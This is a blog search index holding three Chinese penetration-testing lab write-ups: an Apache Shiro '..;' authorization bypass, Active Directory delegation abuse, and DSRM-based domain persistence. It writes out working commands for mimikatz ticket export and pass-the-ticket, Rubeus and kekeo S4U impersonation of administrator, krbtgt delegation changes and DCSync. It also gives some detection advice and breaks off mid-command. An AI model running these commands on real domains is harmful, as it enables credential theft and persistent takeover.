<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache shiro漏洞汇总</title>
    <url>/2021/08/09/Apache-shiro%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>想在本篇文章之中总结shiro的经典漏洞，形成自己对shiro洞的看法。</p>
<h1 id="0x01-权限绕过漏洞"><a href="#0x01-权限绕过漏洞" class="headerlink" title="0x01 权限绕过漏洞"></a>0x01 权限绕过漏洞</h1><h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Spring Boot使用Shiro进行身份验证、权限控制。在Shiro &lt;= <strong>1.5.1</strong>的版本中，攻击者可以通过精心构造的URL，<strong>利用Shiro和SpringBoot对URL的处理的差异化，绕过Shiro对Spring Boot中的Servlet的权限控制实现未授权访问</strong>。如通过构造**..;**这样的跳转，可以绕过Shiro中对目录的权限限制。</p>
<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><p>正常访问admin登录界面，会跳转至login.html</p>
<img src="/2021/08/09/Apache-shiro%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/blog\source\_posts\Apache-shiro漏洞汇总\image-20210809162257792.png" alt="image-20210809162257792" style="zoom:67%;">

<p><img src="/2021/08/09/Apache-shiro%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/blog\source_posts\Apache-shiro漏洞汇总\image-20210809170918695.png" alt="image-20210809170918695"></p>
<p>在URL前添加/xxx/..;/，即访问 <strong>localhost:8080/xxx/..;/admin/</strong> 则会显示登录成功直接进入admin管理界面</p>
<img src="/2021/08/09/Apache-shiro%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/blog\source\_posts\Apache-shiro漏洞汇总\image-20210809162041175.png" alt="image-20210809162041175" style="zoom:67%;">

<ol>
<li>客户端请求URL: /xxx/..;/admin/index</li>
<li>shrio内部处理得到校验URL为 /xxx/..,因为不等于/admin/**所以绕过用户名密码校验。校验通过</li>
<li>springboot处理 /xxx/..;/admin/index , 最终请求 /admin/index, 成功访问了后台请求.</li>
</ol>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><h2 id="漏洞检测："><a href="#漏洞检测：" class="headerlink" title="漏洞检测："></a>漏洞检测：</h2><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ol>
<li><a href="https://github.com/apache/shiro">https://github.com/apache/shiro</a></li>
</ol>
<h1 id="0x02-反序列化漏洞"><a href="#0x02-反序列化漏洞" class="headerlink" title="0x02 反序列化漏洞"></a>0x02 反序列化漏洞</h1><h2 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><h2 id="漏洞利用：-1"><a href="#漏洞利用：-1" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h2 id="总结及思考："><a href="#总结及思考：" class="headerlink" title="总结及思考："></a>总结及思考：</h2><h2 id="漏洞检测：-1"><a href="#漏洞检测：-1" class="headerlink" title="漏洞检测："></a>漏洞检测：</h2>]]></content>
      <tags>
        <tag>漏洞复现</tag>
        <tag>渗透测试</tag>
        <tag>网络空间安全</tag>
        <tag>Java中间件</tag>
        <tag>shrio</tag>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>域权限维持之域委派</title>
    <url>/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>参考资料给出自己关于域内委派的一些认识。</p>
<p>委派就是将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。<strong>将我的权限给服务账户</strong>。</p>
<p>域内委派历史发展为：非约束委派 -&gt; 约束委派 -&gt; 基于资源的约束委派，在着稳固防守的方向去发展。测试环境一如既往，此处不再赘述</p>
<h1 id="0x01-简介："><a href="#0x01-简介：" class="headerlink" title="0x01 简介："></a>0x01 简介：</h1><p>1.<strong>域委派</strong>：<strong>将域内用户A的权限委派给服务账户B，使得服务账户B能以域用户A权限开展域内活动，获得相关域内服务资源权限。主要涉及windows的权限控制。</strong>假设用户A利用自己的身份可以访问到一个网站B，请求网站的资源C，但是网站B上边本身没有资源C，那么网站B就需要用用户A的身份去访问另外一台机器去获取资源C再给到用户</p>
<p>2.SPN(ServicePrincipal Names)：服务主体名称，是服务实例(如HTTP、SMB、MySQL等服务)的唯一标识符，相当于每个服务(人)的身份证。每个使用Kerberos的服务都需要一个SPN。</p>
<ul>
<li>一个用户账户可以有多个SPN，<strong>一个SPN对应某用户的一个服务</strong>。</li>
<li>SPN扫描可识别内网中正在运行重要服务的主机。</li>
<li>SPN分为两种：<ul>
<li>一种是注册在AD的<strong>机器帐户</strong>(<strong>Computers</strong>)下：当服务权限为 Local System 或 Network Service，则SPN注册在机器帐户(Computers)下。</li>
<li>一种是注册在**域用户帐户(Users)**下：当服务权限为域用户</li>
</ul>
</li>
<li>默认普通机器账号有权注册SPN，<strong>普通域用户账号无权注册SPN</strong></li>
</ul>
<p>3.<strong>服务账号：</strong>服务包括http mysql。服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MSSQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录。</p>
<h1 id="0x02-非约束委派"><a href="#0x02-非约束委派" class="headerlink" title="0x02 非约束委派"></a>0x02 非约束委派</h1><p>将域内用户A的权限委派给服务账户B，使得服务账户B能以域用户A权限随时访问任何服务</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>当某主机访问配置有非约束性委派主机时，会将自己的可转发TGT发送到配置了非约束性委派的主机上。一旦域管账号访问了配置了非约束性委派的主机，就会把自己的TGT与此TGT中存储的session key留下，可被攻击者利用生成黄金票据</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/13.png"></p>
<p>流程如下：</p>
<p>前四步为用户与KDC之间的身份认证和票据授权服务，接下来是牵扯委派的</p>
<ol>
<li>用户向KDC请求可转发TGT，记为TGT1</li>
<li>KDC返回TGT1</li>
<li>用户通过TGT1向KDC申请访问服务1的ST</li>
<li>KDC返回ST</li>
<li>用户通过TGT1向KDC请求转发TGT2</li>
<li>KDC返回TGT2，此时用户有ST、TGT1和TGT2</li>
<li><strong>用户发送ST、TGT1、TGT2给服务1</strong></li>
<li><strong>服务1通过用户的TGT2请求KDC</strong>，<strong>以用户名义请求服务2的ST</strong></li>
<li>KDC返回给服务1服务2的ST</li>
<li>服务1以用户名义向服务2发出请求</li>
<li>服务2响应服务1的请求</li>
<li>服务1响应用户第7步的请求</li>
</ol>
<p>此流程有个问题：TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p>
<h2 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p>设置域账号为服务账号，因为只有服务账号才可以开启 S4U 的功能。再将test账户的委派属性设置为非约束委派模式。</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/10.png"></p>
<h2 id="发现可利用账户："><a href="#发现可利用账户：" class="headerlink" title="发现可利用账户："></a>发现可利用账户：</h2><p>在域控主机上用powersploit查询非约束委派的主机和账户:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-NetComputer -Unconstrained -Domain wlaq.com</span><br><span class="line">Get-NetUser -Unconstrained -Domain wlaq.com</span><br></pre></td></tr></table></figure>

<h2 id="确保DC的administrator访问win10的winrm"><a href="#确保DC的administrator访问win10的winrm" class="headerlink" title="确保DC的administrator访问win10的winrm:"></a>确保DC的administrator访问win10的winrm:</h2><p>注：server2008之后，所有的server主机默认开启winrm</p>
<p>在win10上登录用户test，启动winrm服务。<strong>远程powershell管理必须启用winrm服务</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winrm e winrm&#x2F;config&#x2F;listener</span><br><span class="line">winrm quickconfig</span><br><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>

<p>DC以administrator身份登录WIN-10。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter-PSSession -ComputerName WIN-10</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/11.png"></p>
<p>然后在win10上登陆本地管理员账户swanq抓取TGT并导入本地</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;Kerberos::list &#x2F;export&quot; exit &#x2F;&#x2F;导出票据</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;kerberos::ptt &lt;票据名称&gt;&quot; &quot;kerberos::list&quot; exit &#x2F;&#x2F;导入票据</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/12.png"></p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/15.png"></p>
<p>访问DC的共享目录成功</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/14.png"></p>
<p>由于域控以winrm登录过WIN-10,winrm服务拥有域控用户的TGT，即可以</p>
<h1 id="0x03-传统的约束委派"><a href="#0x03-传统的约束委派" class="headerlink" title="0x03 传统的约束委派"></a>0x03 传统的约束委派</h1><p>传统的约束委派是“正向的”，<strong>通过修改服务A属性<code>msDS-AllowedToDelegateTo</code>，添加服务B的SPN（Service Principle Name），设置约束委派对象（服务B）</strong>，服务A便可以模拟用户向DC请求访问服务B以获得服务票据（ST）来使用服务B的资源。微软在 windows server 2003 中引入了约束委派，引入了 S4U协议对 Kerberos 协议进行拓展， S4U 支持两个子协议：</p>
<ul>
<li>Service for User to Self (S4U2Self)</li>
<li>Service for User to Proxy (S4U2proxy)</li>
</ul>
<p>这两个扩展都允许服务代表用户向 KDC 请求票证。S4U2self：代表以用户的名义请求用户需要服务的 ST；S4U2proxy以用户的名义请求其它服务的 ST，约束委派就是限制了 S4U2proxy 扩展的范围。</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/7.png"></p>
<h2 id="原理：-1"><a href="#原理：-1" class="headerlink" title="原理："></a>原理：</h2><p>利用约束委派就是想办法去获取可转发的票据，此时方法就是拿下配置了约束性委派的主机和它的hash，就可以劫持此主机的kerberos请求过程，获得任意用户权限的票据</p>
<p>流程如下：</p>
<p>前提：用户已向KDC申请到了专属于访问服务１的TGT</p>
<ol>
<li>用户向服务1发出请求</li>
<li>服务１<strong>通过S4U2self扩展模拟用户向KDC请求ST</strong></li>
<li>KDC返回给服务1用于验证服务1的ST</li>
<li>服务１响应用户请求</li>
<li>用户此时想通过服务１访问服务２，即委派服务１访问服务２.前提是服务１有TGT和从用户到服务1的可转发ST1</li>
<li><strong>服务1通过S4U2Proxy扩展请求KDC返回一个用于验证服务2的ST，即ST2</strong></li>
<li>KDC在验证PAC的数字签名后,如果没有失败（成功或没有PAC），将返回ST2给服务1</li>
<li><strong>服务1代表用户使用ST2请求服务2</strong>，服务2判断此用户是否经过KDC验证</li>
<li>服务2响应服务1的请求</li>
<li>服务1响应用户请求</li>
</ol>
<p>在约束委派的情况下，<strong>服务用户只能获取某个用户或者主机的ST，只能用模拟用户访问特定的服务，无法获取用户的 TGT</strong></p>
<h2 id="环境搭建：-1"><a href="#环境搭建：-1" class="headerlink" title="环境搭建："></a>环境搭建：</h2><h3 id="查询约束委派主机和用户："><a href="#查询约束委派主机和用户：" class="headerlink" title="查询约束委派主机和用户："></a>查询约束委派主机和用户：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain wlaq.com</span><br><span class="line">Get-DomainUser -TrustedToAuth -Domain wlaq.com</span><br></pre></td></tr></table></figure>

<p>发现约束委派用户，添加服务时，并没有cifs服务，windows server 2019并未安装cifs选项。<br><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/16.png"></p>
<p>安装cifs服务，并配置好该用户到域控的cifs协议的约束性委派</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/18.png"></p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/19.png"></p>
<h3 id="提取非约束委派账户test的哈希"><a href="#提取非约束委派账户test的哈希" class="headerlink" title="提取非约束委派账户test的哈希"></a>提取非约束委派账户test的哈希</h3><p>用rubeus请求TGT:</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/21.png"></p>
<p>模拟ST：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u &#x2F;ticket:code &#x2F;impersonateuser:administrator &#x2F;domain:wlaq.com &#x2F;msdsspn:cifs&#x2F;WIN-2019-DC.wlaq.com &#x2F;dc:WIN-2019-DC.wlaq.com &#x2F;ptt</span><br></pre></td></tr></table></figure>

<p>或者用kekeo请求TGT，方便后续申请可转发票据ST</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/22.png"></p>
<p>然后利用此TGT去申请向TGS申请ST票据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;利用这个票据通过伪造S4U请求以administrator身份访问WIN-2019-DC的ST</span><br><span class="line">tgs::s4u &#x2F;tgt:TGT_test@WLAQ.COM_krbtgt~wlaq.com@WLAQ.COM.kirbi &#x2F;user:administrator@wlaq.com &#x2F;service:cifs&#x2F;WIN-2019-DC.wlaq.com</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/23.png"></p>
<p>此时生成对应的AS票据，票据中forwardable代表票据是可转发的</p>
<p>记得将kekeo生成的票据贴到mimikatz所在目录下，通过mimikatz导入生成的可转发票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt TGS_administrator@wlaq.com@WLAQ.COM_cifs~WIN-2019-DC.wlaq.com@WLAQ.COM.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/23.png"></p>
<p>此时访问域控共享目录成功：</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/14.png"></p>
<h1 id="0x03-基于资源的约束委派"><a href="#0x03-基于资源的约束委派" class="headerlink" title="0x03 基于资源的约束委派"></a>0x03 基于资源的约束委派</h1><p>要配置受约束的委派，必须拥有<strong>SeEnableDelegation</strong>特权，但该特权通常仅授予域管理员。为了使用户/资源更加独立，Windows Server 2012 引入了基于资源的约束委派(RBCD)。受限委派的机制变成了基于资源的约束委派。基于资源的约束委派则是相反的，通过<strong>修改服务B属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>，添加服务A的SPN</strong>，让服务A模拟用户访问B资源。</p>
<ul>
<li>配置在后端目标服务或资源上(例如后端的 CIFS 服务)</li>
<li>允许资源配置受信任的帐户，然后委派给他们。</li>
</ul>
<p>两者作用相同，但方向相反：</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/8.png"></p>
<h2 id="原理：-2"><a href="#原理：-2" class="headerlink" title="原理："></a>原理：</h2><p>利用msDS-AllowedToActOnBehalfOfOtherIdentity属性，可在AD基础设施中隐藏特权访问权限。若在krbtgt账户的msDS-AllowedToActOnBehalfOfOtherIdentity属性中设置某用户账户的SID，此账户就可以从AS处拿到有效TGT，也就意味着拿到了黄金票据。</p>
<h2 id="环境搭建：-2"><a href="#环境搭建：-2" class="headerlink" title="环境搭建："></a>环境搭建：</h2><p><strong>任何具有计算机帐户写权限的用户都可以设置 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。</strong>此处假设攻击者已经获得写权限，要利用此属性来实现目标的持久化访问。</p>
<p>设置test的写权限：<br><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/25.png"></p>
<p>test作为服务A，在DC上配置test到krbtgt的基于资源的约束委派</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount test</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/26.png"></p>
<p>获取test的NTLM hash:</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/27.png"></p>
<p>使用Rubeus进行基于资源的约束性委派攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;Rubeus.exe s4u &#x2F;user:test &#x2F;rc4:a3101e2adce41a4d7b62dcbd25911391 &#x2F;domain:wlaq.com &#x2F;msdsspn:cifs&#x2F;WIN-2019-DC.wlaq.com &#x2F;impersonateuser:administrator &#x2F;ptt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/28.png"></p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/29.png"></p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/30.png"></p>
<p>查看共享目录：</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/31.png"></p>
<h1 id="检测与防御："><a href="#检测与防御：" class="headerlink" title="检测与防御："></a>检测与防御：</h1><p><strong>约束性委派：</strong></p>
<ul>
<li><p>事件5136记录cifs服务属性更改</p>
</li>
<li><p>DC上4769日志请求的服务票据为0x17为RC4-HMAC加密，kerberos目前使用AES加密，所以判断可能是攻击行为</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/32.png"></p>
</li>
</ul>
<p><strong>基于资源的约束性委派：</strong></p>
<ul>
<li>事件5136记录krbtgt账户msDS-AllowedToActOnBehalfOfOtherIdentity属性变更</li>
<li>DC上4769日志不安全的RC4加密</li>
<li>事件4738可以检测出哪些用户被设置为密码永不过期</li>
<li>4688可以检测可疑添加修改spn的setspn进程</li>
<li>sysmon事件1同样检测进程setspn</li>
</ul>
<p>清除约束性委派可直接对相应用户清除，约束性委派需设置SPN，且要求目标账户密码用不更新，因此可以检查当前环境下是否存在带有SPN属性的异常账户，并且将所有高权限管理员账户设置为账户敏感且无法委派。检测密码用不更新且有SPN的账户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Get-ADUser -Filter * -Properties ServicePrincipalName, PasswordNeverExpires | ? &#123;($.ServicePrincipalName -ne “”) -and ($.PasswordNeverExpires -eq $true)&#125;</span><br></pre></td></tr></table></figure>

<p>清除基于资源的约束委派可以使用powershell脚本，Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount $null</p>
<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/33.png"></p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a href="https://www.cnblogs.com/Yang34/p/14264356.html">https://www.cnblogs.com/Yang34/p/14264356.html</a></li>
<li>非约束委派：<a href="https://eviladan0s.github.io/2020/04/14/kerberos-delegation/#%E5%88%A9%E7%94%A8">https://eviladan0s.github.io/2020/04/14/kerberos-delegation/#%E5%88%A9%E7%94%A8</a></li>
<li><a href="https://www.cnblogs.com/Yang34/p/14264356.html">https://www.cnblogs.com/Yang34/p/14264356.html</a></li>
<li><a href="http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/">http://blog.nsfocus.net/analysis-attacks-entitlement-resource-constrained-delegation/</a></li>
<li>SPN：<a href="https://www.163.com/dy/article/FC4RFSLI05372NE2.html">https://www.163.com/dy/article/FC4RFSLI05372NE2.html</a></li>
<li><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting</a></li>
<li><a href="https://www.c0bra.xyz/2020/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%E5%AD%A6%E4%B9%A0/">https://www.c0bra.xyz/2020/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos%E5%A7%94%E6%B4%BE%E5%AD%A6%E4%B9%A0/</a></li>
<li>powershell或cmd执行命令，先去系统变量的路径当中按序查找，找到即执行。若提示找不到，自然需要将相关路径加入系统变量。</li>
<li>远程powershell管理除了有mstsc之外，还可以用winrm：<a href="https://www.cnblogs.com/endv/p/6540584.html">https://www.cnblogs.com/endv/p/6540584.html</a></li>
<li>winodws大小写不敏感，Linux不同</li>
<li>UAC：即将申请更高权限的操作(windows表现为界面弹窗)，所以才会有bypass uac</li>
<li>ACL：访问控制列表，类似于防火墙的应用上开访问通道</li>
<li></li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$user &#x3D; Get-ADUser test -Properties &quot;msDS-AllowedToDelegateTo&quot;</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; &#x3D; @(&quot;krbtgt&#x2F;WIN-2019-DC.wlaq.com&quot;) &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/19/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/20.png"></p>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
        <tag>域环境</tag>
        <tag>委派</tag>
        <tag>约束委派</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透维权之DSRM</title>
    <url>/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/</url>
    <content><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>除了krbtgt账户外，DC上还有一个可以利用的账户：目录服务还原模式账户DSRM。本篇文章主要介绍攻击者在获取域管权限之后，利用DSRM来持久化权限的手法</p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>每个域控中都有一个本地管理账户，就是DSRM账户。DSRM（directory service restore mode目录服务还原模式账户）,是Windows域环境中域控的安全模式启动选项，DSRM的作用是允许管理员在域环境出现故障或崩溃时还原、修复、重建<strong>活动目录数据库</strong>，使域环境的运行恢复正常。</p>
<ul>
<li>域控上的本地管理员账户即目录服务还原模式账户(DSRM)</li>
<li><strong>DSRM的密码在DC安装时设置，很少被修改，存储在SAM文件中</strong></li>
<li><strong>其他域中密码包括administrator保存在NTDS.dit中</strong></li>
<li>修改DSRM：在DC上运行ntdsutil</li>
<li>DSRM被修改 == 域控的administrator密码hash被修改 -&gt; 必要条件</li>
<li>但如果修改DC的administrator的密码hash，SAM数据库的hash并不会被改变</li>
</ul>
<p>​      利用方式：<strong>攻击者将DSRM账户的hash与krbtgt同步，就算此时应急改变DC的administrator的密码，也可以继续利用pth哈希传递攻击。</strong></p>
<p>两个条件：</p>
<ol>
<li>此攻击需要使用DC的<strong>ntdsutil来修改DSRM账户的密码</strong>。</li>
<li>需要修改<strong>DSRM的登录方式</strong>。</li>
</ol>
<p>因此在windows server 2000及之后对DSRM使用控制台做出了限制。</p>
<h1 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h3><table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
<th>系统</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
<td>windows server 2019(x64)</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域管/域成员</td>
<td>windows 10(x64)</td>
</tr>
</tbody></table>
<h3 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h3><p>修改DSRM密码之后，抓取的Administrator的SAM数据库中的NTLM-hash就变成了DSRM账户密码。</p>
<p>修改DSRM有两种方法:</p>
<ol>
<li><p>密码通过明文指定：ntdsutil恢复DSRM密码，并修改密码</p>
<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/1.png"></p>
</li>
<li><p>域账户同步swanq与DSRM密码hash</p>
<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/2.png"></p>
</li>
</ol>
<p>我们采用同步域用户的方式，也就是第二种方式进行攻击利用，直接更改DSRM账户密码并不能实现CIFS服务查看共享目录的功能即攻击过程。</p>
<p>查看本机krbtgt账户的NTLM hash：44702a4f5416df5310e81e3e697feac8</p>
<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/9.png"></p>
<p>查看SAM文件中本地管理员的NTLM hash-DSRM：45a524862326cb9e7d85af4017a000f0</p>
<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/11.png"></p>
<p><strong>命令集合：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NTDSUTIL  &#x2F;&#x2F;打开ntdsutil </span><br><span class="line">set dsrm password  &#x2F;&#x2F;设置DSRM密码 </span><br><span class="line">reset password on server null  &#x2F;&#x2F;在当前域控上恢复DSRM密码 &lt;password&gt;  &#x2F;&#x2F;修改密码，注意这里输入的是DSRM密码,而不是Administrator的密码 </span><br><span class="line">&lt;password&gt;  &#x2F;&#x2F;再次输入 </span><br><span class="line">q  &#x2F;&#x2F;退出DSRM密码设置模式 </span><br><span class="line">q  &#x2F;&#x2F;退出ntdsutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz:</span><br><span class="line">&#x2F;&#x2F;获取krbtgt的账户密码</span><br><span class="line">lsadump::dcsync &#x2F;domain:wlaq.com &#x2F;user:krbtgt </span><br><span 